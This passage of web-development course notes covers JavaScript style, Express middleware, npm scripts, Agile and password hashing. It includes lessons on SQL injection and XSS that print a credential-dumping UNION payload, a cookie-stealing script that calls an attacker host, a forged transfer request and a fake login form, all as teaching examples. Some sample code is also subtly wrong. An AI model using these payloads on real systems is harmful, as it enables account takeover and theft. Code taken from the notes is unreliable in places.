  * Inner functions should be stored in a variable. Doing so makes it easier to read scope.

* Always use a verb in function names.

* Function names should be descriptive of their actions performed.

* Never use abbreviations in function names.

* Use camel case for two word function names.

* Each function/method should do only one thing.

### Characters in Naming  

* Use any letter of the alphabet, uppercase or lowercase.

* Use any number, 0 - 9.

* Do not use backslash `\`.

* Most variables start with a lowercase letter.

* Constructors start with an uppercase letter.

### Whitespace  

* The word `function` should be followed with one space.

* Apply one space after a keyword when followed by a left parentheses `(`.

  * Functions are the exception to this rule.

* The second parentheses `)` following a function, before an opening brace `{` should be followed by a space.

* Follow a comma `,` with one space.

* Within a `for` statement, follow a semicolon `;` with one space.

* A semicolon `;` at the end of a statement should be followed by a line break.

* When using a plus symbol `+` to concatenate values, include a space before and after the plus `+`.

### Line Breaks  

* Nested statements should be indented.

* Avoid excessively long lines.

* When breaking a line, do so after a left brace `{`, left bracket `[`, left parentheses `(`, comma `,`, or before a period `.`, question mark `?`, or colon `:`.

* Try to include just one statement per line.

* When a function statement is broken onto multiple lines, the closing brace `}` should be on the same level of indentation as the beginning of the function declaration.

* When an array is broken onto multiple lines, the closing bracket `]` should be on the same level of indentation as the beginning of the array.

* When an object is broken onto multiple lines, the closing brace `}` should be on the same level of indentation as the beginning of the object.

### Comments  

* Use comments sparingly.

* Using descriptive keywords and writing smaller statements will provide clarity to the reader, requiring no comments.

* When writing a comment make sure it is describing something that may not be immediately recognizable.

### Other  

* Use `===` whenever possible to ensure matching data types and to avoid type conversion. Avoid `==` value matching only.

* In general, make classes and objects as short as possible.

  * Use prototypal inheritance to distribute properties and methods.

  * Try to isolate values and functionality to small reusable components or modules.

* Don't repeat yourself (DRY).

## Examples  

```js
const bookList = [
  {
    title: 'Turtles All the Way Down',
    author: 'John Green'
  },
  {
    title: 'Camino Island',
    author: 'John Grisham'
  },
  {
    title: 'Wonder',
    author: 'R. J. Palacio'
  }
]

function makeSentence(object) {
  const sentence = 'Read ' + object.title + ', by ' + object.author + '.';
  console.log(sentence);
}

// call makeSentence with every object in bookList
for (let i = 0; i < bookList.length; i++) {
  makeSentence(bookList[i]);
}
```

> The use of the variable `i` obviously ins't very descriptive here. In this case `i` is a commonly known and widely used variable to describe an `iterator`. Another common one character variable you may encounter is `e` in place of `event`.

---

[Web Security: Introduction](WebSecurityIntroduction.md)

# Appropriate Use cases To Run `next()`  

## Terminology  

* `middleware`:

  * A function that comes before `route handlers` or even other `middleware` functions.

  * It has access to the `request` and `response`, as well as the `next` callback in the `request - response` cycle.

  * Use `middleware` functions to:

    * Execute code:

      * body parsing.

      * cookie parsing.

      * json request.

      * etc.
      
    * Change the `request` and/or the `response` objects.

    * End the `request - response` cycle.

    * Call the `next middleware` function.

* `next`:

  * When authoring `middleware`, use `next` to indicate that the `middleware` function has finished.

  * `next` functions as a callback.

  * Calling next continues the processing of the `request`.

  * Failing to call `next` will cause the process to hang.

  * This is because `Express` has no way of knowing that the operation is done and that it needs to move down the pipeline to the next `middleware` or `route`.

### Using Next  

* Asynchronous setting:

  * Example: looking up data that results in a `callback`.

  * Call `next` inside the callback.

* Invoking a route:

  * invoking `next('route')` will skip to the next route handler.

  * Subsequent functions will not be executed.

* Passing errors:

  * Pass errors to `next` to handle them separately.
  
> *If the current middleware function does not end the request-response cycle, it must call next() to pass control to the next middleware function. Otherwise, the request will be left hanging. - Expressjs.com*

## Calling Next()  

### Example  

```js
var express = require('express');
var bodyParser = require('body-parser');
var app = express();

app.set('views', './views');
app.set('view engine', 'mustache');

app.use(express.static('public'));
app.use(bodyParser.urlencode({ extend: true }));

app.use(function(req, res, next){
  /* Middleware logic.
  Example:
  Load a session / user
  Then, call next()
  */
  next(); // Once the session is loaded, then the process moves on
  // to the next step in the pipeline. In this case, a route.
});

app.get('/', function(req, res, next){
  // req.session.user is available, since the middleware ran first and process a request for the session.
  // We can now use the req.session.user object in the view template.
  res.render('index', {title: 'home'});
});
```

## Invoking The Next Route  

### Example  

* Use `next('route')` when using multiple callback function in the route handler.

```js
app.get('/foo',
function checkRegistration (req, res, next){
  if(!req.user.registered){
    // If user has not registered, skip to the next route.
    // getRegistration will not be executed.
    next('route')
  }
}, function getRegistration (req, res, next) {
  Registration.find(function (err, data){
    if (err) return next(err)
    res.json(data)
  });
});
```

> Passing anything into `next` other than the string 'route', will cause `Express` to process the request as being in *error*. Subsequent `middleware` functions and non-error handling routing will be skipped.

## Passing Errors  

### Example  

* Passing an error into `next()` instructs `Express` to process the `error` middleware.

* Using `next()` to pass an error(s) helps consolidate error processing into a single point in the application, instead of defining an error from within each route.

```js
var express = require('express');
var bodyParser = require('body-parser');
var Sequelize = require('sequelize');
var sequelize = {};
var app = express();

app.set('views', './views');
app.set('view engine', 'mustache');

app.use(express.static('public'));
app.use(bodyParser.urlencode({ extend: true }));


// In this example '/post' does not exist.
// This request will cause an error, which will be handled by the * error path.
app.get('/post', function(req, res, next) {
  Post.findById(1234).then(function(post, err){
    if (err) {
      return next(err);
    }
    if(!post) {
      var notFound = new Error('Post not found!');
      notFound.status = 404;
      return next(notFound);  
    }
    res.send(post);    
  });
});

app.get('*', function(req, res, next) { // We handle any GET request path by assigning a path of *
  var err = new Error();
  err.status = 404;
  next(err); // Pass the error to the error middleware.
});

// Error middleware:
// Error middleware order matters. Keep them together and consecutive, below the routes.
// Error middleware is different from a regular middleware.
// It needs four arguments: err, req, res and next.
app.use(function(err, req, res, next) {
  if(err.status !== 404) {
    return next();
  }
  res.send(err.message);
});

// IF the error is not a 404, you can specify another status.
app.use(function(err, req, res, next) {
  // during development we may want to print the errors:
  console.log(err.stack);
  // Log error for debugging.
  log.error(err, req);
  res.status(500);
  res.send('Oops, we broke the internet!');
});

app.listen(3000);
```

### Default Error Handler  

> Express comes with a built-in error handler, which takes care of any errors that might be encountered in the app. This default error-handling middleware function is added at the end of the middleware function stack.
> 
> If you pass an error to next() and you do not handle it in an error handler, it will be handled by the built-in error handler; the error will be written to the client with the stack trace. The stack trace is not included in the production environment. - expressjs.com

* Custom error handler:

  * When the headers have already been sent, delegate the default error handling mechanism in Express.
  
```js
function errorHandler (err, req, res, next) {
  if (res.headersSent) {
    return next(err)
  }
  res.status(500)
  res.render('error', { error: err })
}
```

---

[Web Security: Introduction](WebSecurityIntroduction.md)

# Lecture Notes  

## Terminology  

* `Injection`: text-based attack that exploits an interpreter's syntax.

  * Implications: data corruption, data loss, data theft, denial of access.

## SQL Injection  

### Database  

* In this example the X-Men have an 'accounts' database with three fields: username, role, and password.

* To make the problems worse, the passwords are stored as plain text!

| id	| username	| role	| password |
| :--- | :--- | :--- | :--- |
| 1	| wolverine	| owner	| claws! |
| 2	| profx	| admin	| mindgames |
| 3	| cyclops	| owner	| lookskill |
| 4	| storm	| owner	| umbrella |
| 5	| beast	| admin	| bluevelvet |

### Vulnerable Code  

Even though legitimate, the code is vulnerable to injections since anything can be passed into the query.

```js
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  try {
    sequelize.query(
      "SELECT * FROM accounts WHERE role = '"​ + req.params.role + ​"' ", // <---Vulnerability!!!!
      { type: sequelize.QueryTypes.SELECT}
    )
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
```

### Legitimate Query  

* Searching for all fields, `*`, who are admins.

  * **Input query**: `admin`

  * **Resulting query**:
  
```  
SELECT * FROM accounts WHERE role = ('admin')
```

* This query would return:

```
profx
beast
```

### Malicious Query  

* Here Magneto uses a single-quote `'` to break out of the string context and into the query.

* Then, he passes in the following malicious query:

  * **Input query**: `') UNION SELECT username||'_'||password FROM accounts --`

  * This would append the username and passwords for all X-Men in the database who are admins!

    * double pipes, `||`, are used for concatenating.

    * The `--` comments out the remaining text. This "consumes" the final code provided by the application.
    
* **Resulting query**:

> SELECT * FROM accounts WHERE role = ('`%') UNION SELECT username || '_' ||password FROM accounts --`

* This query would return the following:

```
profx_mindgames
beast_bluevelvet
```

## Input Validation  

* Input sanitation is one way of preventing injections by limiting input in order to avoid problem characters.

* One method of sanitation is whitelisting.

### Whitelisting  

* Defining *allowed* inputs values (letters, digits, spaces) and conditions.

#### Example

```
// Limiting input to letters.
/[a-zA-Z]/

// Limiting input to digits.
/[0-9]/

// Limiting input to letters and digits.
/[a-zA-Z0-9]/

// Limiting input to letters, digits and Spaces
/[a-zA-Z0-9 ]/
```

### Implementation

* Validate that the role contains only letters.

```js
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  // Validate letters and digits, only!
  // ^ marks the beginning of the string.
  if(!req.params.role.match(/[^a-zA-Z]/)){
    var valError = new Error ("Input must be letters, only.");
    valError.status = 500;
    next(valError);
  }
  try {
    sequelize.query(
      "SELECT * FROM accounts WHERE role = '" + req.params.role + ​"' ",
      { type: sequelize.QueryTypes.SELECT}
    )
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
// Other Routes
// varError middleware.
```

## Escaping  

* Escaping is a widely used method.

* It is a ready-to-go function, provided by many libraries, for escaping well-know problem characters.

### Implementation  

```js
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  // db is the database.
  var dbEscape = db.escape(req.params.role);
  var type = "{ type: sequelize.QueryTypes.SELECT}";
  var query = "SELECT * FROM accounts WHERE role = '" + dbEscape + "' " + type;
  try {
    sequelize.query(query)
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
// Other Routes
// Error handlers
```

## Prepared Statements  

* The `SQL` query code is predefined by the developer so that parameters are passed into the query later.

* The variable data is replaced by a *placeholder*, such as a `?`, which is then processed by the database as a parameter.

* `Prepared statements (parameterized statements)` are parsed, compiled, and optimized by the database **separately** from any parameters before they are executed.

* Why is it effective against injections?

  * The input values in an `SQL` query are sent to the server *after* the query is sent to the server.

  * Incoming input is interpreted as data, instead of `SQL` code.

* Check ORM and database documentation for details.

### Implementation  

* `Sequelize` example.

```js
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  try {
    sequelize.query(
      "SELECT * FROM accounts WHERE role ?",
      { replacement: ["'​ + req.params.role + ​'"]
      type: sequelize.QueryTypes.SELECT}
    )
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
// Other Routes
// Error handlers
```

## ORM Built-in Query Methods  

* ORM built in methods automatically take care of escaping.

* Check ORM documentation for details.

#### Example

* `Sequelize` example.

```js
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  var role = req.params.role;
  Accounts.findAll({
      role: role
  })
  .then(function (admin){
    console.log(admin);
  });
});
// Other Routes
// Error handlers
```

## Programming Culture  

[Bobby Tables](http://www.bobby-tables.com/)

---

[Web Security: Introduction](WebSecurityIntroduction.md)

# The Impact Of XSS On User Privacy  

## Terminology  

* `XSS` (Cross-site scripting):

  * Allows an attacker to inject malicious code into a website through various methods.

  * The `request` / `response` cycle is used as a mechanism to execute the code from the victim's browser.

  * Vulnerable websites are exploited, not the victim's machine.

## How?  

* An attacker uses a vulnerable `input` to *inject* a `string` containing malicious code, which subsequently runs in the victim's browser as legitimate code.

* The JavaScript Code:

  * Can be used to modify the `HTML` by using `DOM` manipulation methods.

  * Can access sensitive information, such as `cookies`.

  * Use `XMLHttpRequest` to send arbitrary content to arbitrary destinations.

## Types of attack:  

* **Reflected XSS**: it does **not** originate from the targeted server, but from the victim's `request`.

  * This attacked can be delivered via another website or an email.

  * The injected code is *reflected* off the server in a search result, error message, or another `response` which includes all or part of the `input` sent to the server as a `request`.

    1. A URL containing the malicious code is sent to the victim.

    2. The victim then `requests` the URL from the website.

    3. The website includes the malicious string from the URL in the `response`.

    4. The victim's browser executes the code sending the victims data back to the attacker's server.

* **Persistent (stored) XSS**: the malicious code is stored in a target's server, where it is later retrieved by the victim via a `request` for data containing the malicious code.

  1. The attacker inject the malicious code into the server via a vulnerable form, which is stored in the database.

  2. The victims makes a `request` to the website.

  3. The `response`, containing the malicious code, is sent to the victim.

  4. The victim's browser executes the code sending the victims data back to the attacker's server.

* **DOM-based XSS**: a combination of both `persistent` and `reflected` `XSS`:

  1. A URL containing the malicious code is sent to the victim.

  2. The victim then `requests` the URL from the website.

  3. The targeted website receives the `request`, but *it does not* include the malicious code in the `response`.

  4. The victim's browser executes the *legitimate* code inside the `response`, inserting the malicious code into the website.

  5. The victim's browser executes the *inserted* malicious code and sends the `response` back to the attacker's server containing the victims data.

  6. What makes it different?

  7. No malicious code is inserted into the website.

  8. The website's own code uses the user's input in order to add `HTML` into the page using `innerHTML`.

  9. The code is `parsed` as `HTML`, which in turn executes the code *after* the page has loaded.

* **Key-logging**: malicious code is using `addEventListener` is used to send a victim's keystrokes back to the attacker's server.

## Impact On User Privacy  

### Stealing sensitive data  

* Cardholder data or personal identifiable information (bank account number, address, username, etc) is stolen and used to siphon funds or perform unauthorized transactions

#### Example

* In this example an `XMLHttpRequest` is used to transfer funds from the victim to the attacker.

```
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST',http://youvenoidea.com/transfer',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); xhr.send('transfer[from]=5124834860&transfer[to_user_id]=48&transfer[amount]=1000&commit=Transfer');
  </script>
```

### Stealing credentials  

* `JavaScript` and `HTML` are used to steal credentials instead of `cookies`. A targeted website's login page is cloned and it is served to a victim.

#### Example

* In this example a cloned login page is used to steal a victims credentials.

* The attacker then can wreak havoc in the victim's social media, bank accounts, etc.

```html
<div>
  <h3>Security Alert</h3>
  <h4>Your session has expired.</h4>
  <form action=http://[Attacker IP]>
    Username:<br><input type="text" name="user"><br>
    Password:<br><input type="password" name="pass"><br><br>
    <input type="submit" value="Logon">
  </form>
</div>
```

### Account Hijacking  

* A victim's `session` `cookies` are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.

#### Example

* In this example an attacker targets a forms vulnerable field to inject a malicious image.

```
<script>
new Image().src = 'http://youvenoidea/steal.php?cookies=' +  encodeURI(document.cookie);
</script>
```

## Mitigating XSS  

* All user input should be escaped or sanitized.

### express-validator  

* The `express-validator` module simplifies input sanitation.

### Usage

* Install `express-validator`: `npm install express-validator --save`

* mport: `var validator = require('express-validator')`

* Apply after `body-parser`

```js
//req.body.password = 'a <span>comment</span>';
//req.body.username = " I'm-gonna-hack-you' ";

app.post('/login', function(request, response){
  req.assert('password', 'Password is required').notEmpty();
  req.assert('username', 'Your must enter a user name').notEmpty();

  // Sanitize password and username
  req.sanitize('password').escape(); // Returns: a &lt;span&gt;comment&lt;&#x2F;span&gt;
  req.sanitize('username').escape(); // Returns: I&#x27;m-gonna-hack-you&#x27;

  var errors = request.validationErrors();
  if (errors)
    res.render('error', {errors: errors});
  else
    res.render('login', {password: req.password, username: req.username});
});
```

---

[Web Security: Introduction](WebSecurityIntroduction.md)

# Protecting User Password  

## Terminology  

* `PBKDF2`: a “password-strengthening algorithm” (`HMAC`) use to safeguard a password during a brute force attack by making it difficult, using `iterations`, to check whether or not that password is the master password.

  * `Iterations`: the number of times the encryption algorithm is applied.

    * increases the strength of a password by increasing the time it takes to test each key in a brute force attack.

    * `key`: the combination of the password, `salt`, and `iterations` count.

* `SHA-256`: Cryptographic Hash Algorithm that generates a unique 256-bit (32-byte) signature.

  * Encoding:

    * `hex`: 64 characters.

    * `base64`: 44 characters.

* `SHA-512`: Cryptographic Hash Algorithm that generates a unique 512-bit (64-byte) signature.

  * Encoding:

    * `hex`: 128 characters.

    * `base64`: 88 characters.

* `HMAC`: hash based authentication code.

* `Hashing`: the process of creating a fixed-length cryptic string from a variable-length string (password).

* Salt: a unique and random string of characters used as an extra input in a hashing function in order to safeguard a stored password.

  * `salt` is added to the password *before* `hashing`. This helps randomize the password and increases it's complexity in order to safeguard against *rainbow* and *lookup* table attacks.

  * A 12 bit `salt` would require 4096 rainbow tables in order to find a common password.

* `Digest`: In a cryptographic hash function, the `digest` is the function's fixed-size alphanumeric output. (also known as `message digest`, `checksum` and `digital fingerprint`)

* `Crypto` (module):

> The crypto module provides cryptographic functionality that includes a set of wrappers for OpenSSL's hash, HMAC, cipher, decipher, sign and verify functions. -nodejs.org

## Why Salt and Hash?  

* Avoid duplicate `hashe`s.

  * `Hashes` of the same password are identical.

    * Makes it possible to decipher using a rainbow or lookup table.

    * Two users could share the same password, therefore the same `hash`. A hacker can use this to predict passwords.

  * Therefore, adding `salt` to a password and then `hashing` it reduces the chance of having duplicated hashes.

> Never, EVER, store a password as plain text. EVER.

## PBKDF2 Implementation  

1. **Create password hash**:

   * Input: user password.

   * Generate `Salt`.

   * Generate `hash`:

   * Store resulting password `hash`, `salt`, and `iterations` (for validation).

2. **Validate attempted password**:

   * Input: attempted password.

   * Retrieve password `hash`, `salt`, and `iterations`.

   * Generate `hash`:

     * `Hash` attempted password / stored `salt` / stored `iterations`:

   * Assert resulting `hash` against stored `hash`.

### Recommendation  

* `Use Password-Based Key Derivation Function 2 (PBKDF2)`.1

* `Salt` should be as unique as possible. Consider creating a random key with a length greater than 16 bytes.

  * `Iterations` should be a number set as high as possible. The higher, the more secure the key will be.

    * The higher the iteration, the longer it will take to complete the process.

* `keylen`: byte length of the `digest`, derived from the password, `salt` and `iterations`.

* `digest`: use either `sha256` or `sha512` to encrypt the output.

> AGAIN: never, EVER, store a password as plain text. EVER.

## Example  

* In this example we use `Express's` `Crypto` module.

* **Synchronous implementation**: `crypto.pbkdf2Sync(password, salt, iterations, keylen, digest)`

  * If an error happens, an `Error` is thrown. If not, the key is returned as a `Buffer`.

  * [Learn more](https://nodejs.org/api/crypto.html#crypto_crypto_pbkdf2sync_password_salt_iterations_keylen_digest**)

* Your implementation may differ.

> See Node.js docs for asynchronous implementation.

### Creating a hashed password - Implementation suggestion  

* `Crypto` [randomBytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback)

* `Math.ceil()`: returns the smallest integer greater than or equal to a given number. 2

* `toString('base64')`: convert string to base64.

* `toString('hex')`: convert string to a hexadecimal.

* `randomByes()`: generates a random string.

```js
'use strict';

// Require Crypto module
var crypto = require('crypto');

// Set configuration parameters.

var config = {
    salt: function(length){
    // 'Math.ceil(length * 3 / 4)' generates a base64 value.
    return crypto.randomBytes(Math.ceil(32 * 3 / 4)).toString('base64').slice(0, length);
    // If returning a value in hex format, do the following:
    //return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length);
    },
    iterations: 20000, // Specify iteration count.
    keylen: 512, //  Specify algorithm byte length.
    digest: 'sha512' // Specify algorithm.
};


// Generate hash
function hashPassword(passwordinput){
    // Add salt:
    var salt = config.salt(32); // Pass in salt length.
    // Add iterations:
    var iterations = config.iterations;
    // Hash password:
    var hash = crypto.pbkdf2Sync(passwordinput, salt, iterations, config.keylen, config.digest); // Pass in password, salt, iterations, keylength, and algorithm (sha256 or sha512),.
    // Encode hash:
    var hashedPassword = hash.toString('base64');
    // If using hex, do the following:
    // var hashedPassword = hash.toString('hex');

    // Dev log:
    console.log('Hashed password: ', hashedPassword);
    console.log('Salt: ', salt );

    // TODO: save salt, hash, and iterations to database for later retrieval.
    return {salt: salt, hash: hashedPassword, iterations: iterations};
}

// For Demonstration purposes:
// Call hashPassword passing in password input.

hashPassword('password123!');
```

### Password verification  

* Compare saved `hash` to attempted password `hash`.

* Your implementation may differ.

```js
var config = {
    keylen: 512,
    digest: 'sha512'
};

function isPasswordCorrect(passwordAttempt) {
    var savedHash = `saved-hash-in-db`; // Retrieve saved hash.
    var savedSalt = `saved-salt-in-db`; // Retrieve saved salt.
    var savedIterations = `saved-interations-in-db`; // Retrieve saved iterations.

    var hash = crypto.pbkdf2Sync(passwordAttempt, savedSalt, savedIterations, config.keylen, config.digest);

    var hashedPassword = hash.toString('base64');
    // Compared saved hash to attempted password hash.
    // Returns a boolean.
    return savedHash === hashedPassword;
}

//For demonstration purposes:

isPasswordCorrect('myPassword'); // Would return false.
```

##### Lesson Footnotes

* 1: [PBKDF2 - Wikipedia](https://en.wikipedia.org/wiki/PBKDF2)

* 2: [MDN - Math.ceil()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/ceil)

---

[Productivity and UNIX: Introduction](ProductivityUNIXIntroduction.md)

# Agile Software Development  

## Agile Software Development Manifesto  

* **Individuals and interactions**: self-organization and motivation are an integral part of the collaborative development process.

* **Working software**: functional software is favored over document presentation during meetings.

* **Customer collaboration**: continuous stakeholder and customer involvement is a key aspect of the development process.

* **Responding to change**: `Agile Software Development` methods are focused on responding and adapting to development changes.

## Agile Software Development Principles  

1. Improve customer satisfaction by delivering software early and continuously.

2. Be receptive to changing requirements throughout the development process.

3. Frequently deliver working software.

4. Developers should collaborate daily with stakeholders.

5. Support motivated individuals.

6. Face-to-face communication is always best.

7. Measure progress by the delivery of working software.

8. Stakeholders, developers and users should be able to maintain a constant pace.

9. Focused and continuous attention to technical excellence and good design.

10. Simplicity is essential.

11. Self-organizing teams produce the designs, requirements, and architectures.

12. Regularly self assess the team in order to become more effective and to adjust to new circumstances.

## Agile Software Development Terminology  

This represents a handful of core terms. See references for more.

* **Agile Software Development**: methods and practices based on the `Agile Manifesto`, focusing on the development of solutions through the collaboration of self-organizing and cross-functional teams.

* **Scrum**: framework for the interactive development of complex products. Comprised of the `product owner`, `scrum master`, and `scrum team`. It is also comprise of `iterations` and `ceremonies`.

* **Scrum master**: responsible for maintaining `scrum` processes, such as `stand-ups`, removing obstacles that impede progress, facilitating the self-organization of the team.

* **Iteration**: period of time in which the team produces an increment of completed software, which encompasses the complete lifecycle phases (requirements, design, code and test).

* **Sprint**: `scrum` term for `iteration`. A sprint starts with a sprint planning meeting, it ends with a review and it is followed by a sprint retrospective meeting.

* **Velocity**: A form of measurement that measures a teams output.

* **Fail-fast**: rapid deployment of experiments focused gathering the feedback needed to improve software.

* **Pair programming**: two programmers working together on the same code from the one workstation. The 'driver' types the code and the 'navigator' reviews each line of code. It is a form of `extreme programming`.

* **Extreme programming**: software development framework focused on producing higher quality software. Comprised of frequent releases in short development cycles.

* **Test Driven Development**: process of 1-writing failing automated test cases focuses on improvement or new functionality. 2-writing code to make the test pass. 3-refactoring code.

* **Burndown chart**: a public chart displaying the total task hours remaining per day. It shows `backlog` progress.

* **Backlog**: a collection of `tasks` and `stories` to be completed.

* **Story (user)**: basic unit of communication and planning between the `scrum` and the `team`.

* **Task**: description of work to be performed in order to complete a `story`.

* **Task board**: a chart use to organize a team's work by using three columns (at a minimum): "to do", "in progress", and "done".

* **Product owner**: represents the business `stakeholder` "voice" to the `sprint team`.

* **Stakeholder**: anyone, not pertaining to the `team`, who has a vested interested in the outcome of the project.

* **Team**: a committed group of people working together to produce a product and improve performance over time.

* **Standup**: (`scrum` ceremony) a team meeting in which `story` progress is discussed focusing on: 1 - What has been done since yesterday. 2 - What is planned for the day. 3 - What obstacles are blocking progress.

---

[Productivity and UNIX: Introduction](ProductivityUNIXIntroduction.md)

# Using npm package.json scripts to start node and run arbitrary tasks  

## Terminology  

`npm scripts`: command strings defined under the `scripts` property in the `package.json` main object.

* `scripts` make it possible to automate tasks.

* `scripts` are executed in subsequent order.

* `scripts` are accessible in the command line by calling `npm run [script-name]`:

#### Example

```
npm run build
```

> * For a complete list of available scripts, please check the latest npm-scripts docs.
> * For module specific params and options, check the module's docs.

## Basic Scripts  

### Starting, Stopping, and Restarting a Node App  

### context:  

* project

  * app.js
  
### script:  

```js
//package.json
{
   "name": "run-node-example",
   "scripts": {
    "start": "node app.js",
    // Other commands, i.e:
    // "poststart": "echo \"Executing node scripts\""
    "stop": "node app.js",
    "restart": "node app.js"
  },
  //dependencies...
}
```

### running 'app'  

```
npm run start
```

### stopping 'app'  

```
npm run stop
```

### restarting 'app'  

* Runs `stop`, `restart`, and `start`.

```
npm run restart
```

> `restart` runs *in addition* to `stop` and `start`, not instead of the two.

## Lifecycle scripts  

### Hooks  

* Use to run a specific script at a lifecycle event.

  * `pre<script-name>`

    * Use to define a pre-script command

  * `post<script-name>`

    * Use to define a post-script command

* See docs for a complete list of lifecycle events.

### Example 1  

#### pre and post install lifecycle scripts

```js
{
  "scripts": {
    "preinstall": "echo INSTALL SOME PACKAGE",
    //Other scripts here. i.e:
    //"build:js": "browserify main.js -o bundle.js"
    "postinstall": "npm run build"
  }
}
```

### Running the lifecycle  

* This will run the `preinstall` script first and then the `postinstall` script.

```
npm install
```

### Example 2  

```js
// package.json
{
  "scripts": {
    "learncode": "code --learn ./index.js",
    "prelearncode": "echo GO TO THE IRON YARD",
    "postlearncode": "echo GET AN AWESOME JOB!"
  }
  // Dependencies...
}
```

#### running 'learncode'

```
npm run learncode
```

```
// OUTPUT
> prelearncode
GO TO THE IRON YARD

> learncode
learn frontend and backend...
done.

> postlearncode
GET AN AWESOME JOB!
```

## Customizing Commands  

### Passing arguments  

* Pass arguments to the underlying command using `--`:

  * Anything that comes after `--` is appended to the command.

  * `npm run <command> [-- <args>]`
 
#### Example 1

* Lets specify a port other than 3000 for testing purposes.
 
```
{
  "scripts": {
    "start": "node --example app.js",
    "start:test": "npm start -- 4000"
  }
}
``` 
 
#### Example 2

* Here we pass two global `eslint` variable options, in-line.

```js
{
  "scripts":{
    "lint:inlineoptions" : "eslint --env browser --env node app.js"
  }
}
```

### Piping results  

* Use `|` to pipe results from one task to the next.

#### Example

* Here the results of `browserify` are piped into [uglify](https://www.npmjs.com/package/uglify-js), which in turns compresses (`c`) and magles (`m`) them before redirecting them (`>`) into the bundle.js file.

```js
{
  "scripts": {
    "build-js": "browserify main.js | uglifyjs -mc > bundle.js"
  }
}
```

### Running commands in series / parallel  

### Series: `;` and `&&`

```js
// package.json
{
  "scripts": {
    "lint": "eslint; csslint; htmllint"
  }
  // Dependencies...
}
```

### Series using run-s (npm-run-all package)

```js
// package.json
{
  "scripts": {
    "lint": "run-s eslint csslint htmllint"
  }
  // Dependencies...
}
```

### Parallel: `&`

```js
// package.json
{
  "scripts": {
    "lint": "eslint & csslint & htmllint"
  }
  // Dependencies...
}
```

### Parallel using run-p (npm-run-all package)

```js
// package.json
{
  "scripts": {
    "lint": "run-p eslint  csslint  htmllint"
  }
  // Dependencies...
}
```

### Group Commands Scripts  

#### run-all

```js
// package.json
{
  "scripts": {
    "lint": "npm run lint:js $ npm run lint:css $ npm run lint:html",
    "lint:js": "eslint --flag",
    "lint:css": "csslint --another-flag",
    "lint:html": "htmllint --yet-another-flat"
  }
  // Dependencies...
}
```

#### running 'run-all'

* This will run all scripts that start with `lint`:

```
npm-run-all lint:*
```

## Running Arbitrary Tasks  

> The following are just a handful of script examples meant to give you an idea of the things you can do using scripts. For a full list of available commands, see the official npm docs.

## Running tests  

### context:  

* project

  * tests

    * app-test.js

  * app.js
  
### script:  

```js
//package.json
{
   "name": "test-example",
   "scripts": {
    "test": "mocha test"
  },
    //dependencies...
}
```

### Running 'test'  

```
$ npm run test
```

## Deploying to GitHub  

### Basic Example  

```
"scripts": {
    "build:js": "browserify main.js -o bundle.js",
    "git-commit": "git add -A . && git commit -a -m 'gh-pages update'",
    "git-push": "git push origin gh-pages --force && git checkout master",
    "deploy": "npm run build:js && npm run git-commit && npm run git-push"
  }
```

### Running 'deploy'  

```
npm run deploy
```

## Building  

### context:  

* An app that uses `browserify` and `SCSS`.

  * It compiles modules in order to be used in the browser.

* Install `browserify`: `npm install --save browserify`

* Install `node-sass`: `$ npm install -D node-sass`

  * `-D`: writes modules under devDependencies in package.json

* `Project`

  * app.js

  * utilities.js

  * `public`

    * `css`

      * main.css

  * `scss`

    * main.scss
    
```js    
//app.js
var utilities = require('./utilities.js');  
console.log(utilities.somefunction);  
```

```js
//utilities.js
module.exports = {
  somefunction: function(){
    console.log("I'm a utility file!")
  }
};
```

### script  

```js
{
  "name": "build-app",
  "main": "index.js",
  "scripts": {
    "build:js": "browserify main.js -o bundle.js"
  },
  "dependencies": {
    "browserify": "^14.4.0",
    "node-sass": "^4.5.3"
  }
}
```

### Running 'build'  

* This will bundle main.js and its dependencies into one file.

  * `-o bundle.js` tells `browserify` the specific output of the file to be compiled.

```
npm run build:js
```

## Building And Compiling  

```js
{
  "name": "build-app",
  "description": "",
  "main": "index.js",
  "scripts": {
    "build:js": "browserify main.js -o bundle.js"
    "build:css": "node-sass --include-path scss scss/main.scss   public/css/main.css"
    "build": "npm run build:js & npm run build:css"
  },
  "dependencies": {
    "browserify": "^14.4.0",
    "node-sass": "^4.5.3"
  }
}
```

### Running 'build'  

* This will compile the `css` and bundle the JavaScript

```
npm run build
```

### Example: Using postinstall when deploying to heroku  

* We can automatically compile and bundle using `npm install` by specifying this commands in `postinstall`.

```js
{
  "name": "build-app",
  "main": "index.js",
  "scripts": {
    "build:js": "browserify main.js -o bundle.js",
    "build:css": "node-sass --include-path scss scss/main.scss   public/css/main.css",
    "postinstall": "npm run build"
  },
  "dependencies": {
    "browserify": "^14.4.0",
    "node-sass": "^4.5.3",
  }
}
```

### Running 'install'

* When `heroku` runs `npm install`, `postinstall` will be executed after `install` is completed, which in turns runs `build`.

  *  This makes it easier to `deploy` the app to `heroku`.
  
```  
npm install
```

## Automatic Recompiling and Monitoring for Changes  

* Recompile bundle.js whenever a source file changes using `watchify`.

* Monitor for code changes using `nodemon` (restarts server when changes are detected).

  * Install: `npm install --save-dev node-sass nodemon`

### script  

* Let's add it to the script above:

```js
{
  "name": "build-app",
  "main": "index.js",
  "scripts": {
    "build": "npm run build:js & npm run build:css",
    "watch": "npm run watch:js & npm run watch:css",
    "build:js": "browserify main.js -o bundle.js",
